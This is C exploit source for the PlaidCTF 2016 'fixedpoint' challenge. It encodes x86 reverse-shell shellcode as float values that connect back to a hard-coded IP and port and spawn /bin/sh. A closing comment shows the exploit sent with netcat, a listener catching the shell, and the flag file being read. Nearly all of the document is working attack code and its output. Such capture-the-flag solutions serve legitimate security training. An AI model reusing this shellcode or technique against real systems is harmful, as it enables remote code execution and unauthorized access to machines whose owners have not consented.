// --------------------------------------------------------------------------------------------------
// PlaidCTF 2016 - fixedpoint (Pwn 175)
// ------------------------------------------------------------------------------------------------
#include <stdio.h>
#include <stdlib.h>

#define BYTE_1(x)   ( (x) & 0x000000ff)
#define BYTE_2(x)   (((x) & 0x0000ff00) >> 8)
#define BYTE_3(x)   (((x) & 0x00ff0000) >> 16)
#define BYTE_4(x)   (((x) & 0xff000000) >> 24)

#define MIN         0x00000000
#define MAX         0x1fffffff

union U {                               // a nice trick to get raw representation of float
    float f;
    int   d;
};

// ------------------------------------------------------------------------------------------------
/* find an float with a given LSB */
void find_float_1( unsigned char x )
{
    union U u;
    int     i;

    for( i=MIN; i<MAX; ++i )
    {
        u.f = ((float)i) / 1337.0;

        /* the 2nd and 3rd byte will be an: jmp +1 which will skip the MSB */
        if( BYTE_1(u.d) == x && BYTE_2(u.d) == 0xeb && BYTE_3(u.d) == 0x01 )
        {
            printf( "%d\n", i );        // print it
            return;                     //  and return
        }
    }
}

// ------------------------------------------------------------------------------------------------
/* find an float with 2 LSB given */
void find_float_2( unsigned char x, unsigned char y, int f )
{
    union U u;
    int     i, j = 0;                   // j = counter #2

    for( i=MIN; i<MAX; ++i )
    {
        u.f = ((float)i) / 1337.0;

        if( BYTE_1(u.d) == x    && BYTE_2(u.d) == y && 
            BYTE_3(u.d) == 0x40 && BYTE_4(u.d) == 0x48 )    // "dec eax; inc eax"
        {

            if( f == -1 || ++j == f )   // if you found i-th valid solution
            {
                printf( "%d\n", i );    // print it
                if( f != -1 ) 
                    return;             //  and return
            }
        }
    }

    printf( "Error! find_float_2(%x, %x) failed.\n", x, y );
    exit(0);
}

// ------------------------------------------------------------------------------------------------
/* find an float with 2 LSB given, ignoring the 2 MSB */
void find_float_2_any( unsigned char x, unsigned char y )
{
    union U u;
    int     i;

    for( i=MIN; i<MAX; ++i )
    {
        u.f = ((float)i) / 1337.0;

        if( BYTE_1(u.d) == x && BYTE_2(u.d) == y )
        {
            printf( "%d\n", i );        // print it
            return;                     //  and return
        }
    }

    printf( "Error! find_float_2_any(%x, %x) failed.\n", x, y );
    exit(0);
}

// ------------------------------------------------------------------------------------------------
/* find an float with 3 LSB given */
void find_float_3( unsigned char x, unsigned char y, unsigned char z )
{
    union U u;
    int     i;

    for( i=MIN; i<MAX; ++i )
    {
        u.f = ((float)i) / 1337.0;

        if( BYTE_1(u.d) == x && BYTE_2(u.d) == y && BYTE_3(u.d) == z )  
        {
            printf( "%d\n", i );        // print it
            return;                     //  and return
        }
    }

    printf( "Error! find_float_3(%x, %x, %x) failed.\n", x, y, z );
    exit(0);
}

// ------------------------------------------------------------------------------------------------
/* main function */
int main( int argc, char *argv[] )
{
    int i;
    char sc_p1[] = {
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  // start with nop to keep offsets
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      //   consistent
        "\x68"
        "\x80\xd3\xbd\x15"                                  // ip: 128.211.189.21
        "\x5e\x66\x68"
        "\x26\x0f"                                          // port: 9743
        "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
        "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    },
    sc_p2[] = {                                             // shellcode part 2
        "\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1"
        "\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68"
        "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
        "\x53\xeb\xce"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    };
    

    // ========================================================================
    //  NOTE: The numbers that returned by find_float_2(), sometimes lose their
    //  precision so it's possible to a value x-1 instead of x. For this reason
    //  we discard the first few solutions. I noticed that the next solutions
    //  do not have this problem. Idk why but it works :)
    //
    //  Otherwise, we can add +1 so the result will be x-1+1 = x
    // ========================================================================
    find_float_1( 0x90 );                   // nop
    find_float_1( 0x90 );                   // nop
    find_float_1( 0x50 );                   // push eax
    find_float_1( 0x50 );                   // push eax
    find_float_1( 0x5a );                   // pop edx
    find_float_1( 0x5b );                   // pop ebx
    find_float_2( 0xeb+1, 0x72, 1 );        // jmp +70

    // ========================================================================
    for( i=0; i<14; ++i ) {
        find_float_2( sc_p1[(i<<2) | 2], sc_p1[(i<<2) | 3], 10 );
        find_float_2( sc_p1[(i<<2) | 0], sc_p1[(i<<2) | 1], 10 );
    }

    // ========================================================================
    find_float_2( 0xb2+1, 0x1c, 1 );        // mov bl, 0x1c
    find_float_2( 0x31+1, 0xc9, 1 );        // xor ecx, ecx
    find_float_2( 0xb1, 14,   10 );         // mov cl, 14
    find_float_3( 0x66, 0xff, 0x33 );       // push  word ptr [ebx]
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_3( 0x66, 0xff, 0x33 );       // push  word ptr [ebx]
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x5d );                   // pop ebp
    find_float_2( 0x89, 0x2a, 10 );         // mov dword ptr [edx], ebp 
    find_float_1( 0x42 );                   // inc edx
    find_float_1( 0x42 );                   // inc edx
    find_float_1( 0x42 );                   // inc edx
    find_float_1( 0x42 );                   // inc edx
    find_float_2( 0xe2, (0xF7FD0090-0xF7FD00D2) & 0xff, 8 ); // loop "back"
    find_float_1( 0x90 );                   // nop
    find_float_1( 0x90 );                   // nop


    // ========================================================================
    find_float_2( 0xb3, 0xec, 10 );         // mov bl, 0xec
    find_float_2( 0xeb+1, 0x72, 1 );        // jmp +70

    for( i=0; i<14; i++ ) {
        find_float_2( sc_p2[(i<<2) | 2], sc_p2[(i<<2) | 3], 10 );
        find_float_2( sc_p2[(i<<2) | 0], sc_p2[(i<<2) | 1], 10 );
    }

    // ========================================================================
    find_float_2( 0x31+1, 0xc9, 1 );        // xor ecx, ecx
    find_float_2( 0xb1, 14,   10 );         // mov cl, 14
    find_float_3( 0x66, 0xff, 0x33 );       // push  word ptr [ebx]
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_3( 0x66, 0xff, 0x33 );       // push  word ptr [ebx]
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x43 );                   // inc ebx
    find_float_1( 0x5d );                   // pop ebp
    find_float_2( 0x89, 0x2a, 10 );         // mov dword ptr [edx], ebp 
    find_float_1( 0x42 );                   // inc edx
    find_float_1( 0x42 );                   // inc edx
    find_float_1( 0x42 );                   // inc edx
    find_float_1( 0x42 );                   // inc edx
    find_float_2( 0xe2, (0xF7FD0090-0xF7FD00D2) & 0xff, 8 ); // loop "back"
    find_float_1( 0x90 );                   // nop
    find_float_1( 0x90 );                   // nop

    // ========================================================================
    find_float_2( 0xff, 0xe0, 1 );          // jmp    eax 

    return 0;
}

// ------------------------------------------------------------------------------------------------
/*
Terminal #1:
    root@nogirl:~/ctf/plaidctf# gcc fixedpoint_expl.c -o fxp && ./fxp > B
    root@nogirl:~/ctf/plaidctf# cat B | nc fixedpoint.pwning.xxx 7777
    ^C

    (connection will open once you terminate netcat)
    
Terminal #2:
    root@nogirl:~# nc -nvvl -p9743
        listening on [any] 9743 ...
        connect to [128.211.189.21] from (UNKNOWN) [13.90.215.254] 45300
        ls -la
            total 24
            drwxr-xr-x 2 root root 4096 Apr 17 02:08 .
            drwxr-xr-x 4 root root 4096 Apr 17 01:40 ..
            -rwxr-xr-x 1 root root 7424 Apr 17 01:40 fixedpoint_02dc03c8a5ae299cf64c63ebab78fec7
            -rw-r--r-- 1 root root   36 Apr 17 01:41 flag.txt
            -rwxr-xr-x 1 root root  268 Apr 17 02:01 wrapper
        id
            uid=1001(problem) gid=1001(problem) groups=1001(problem)
        cat flag.txt
            PCTF{why_isnt_IEEE_754_IEEE_7.54e2}
        exit
        sent 28, rcvd 373
*/
 // ------------------------------------------------------------------------------------------------
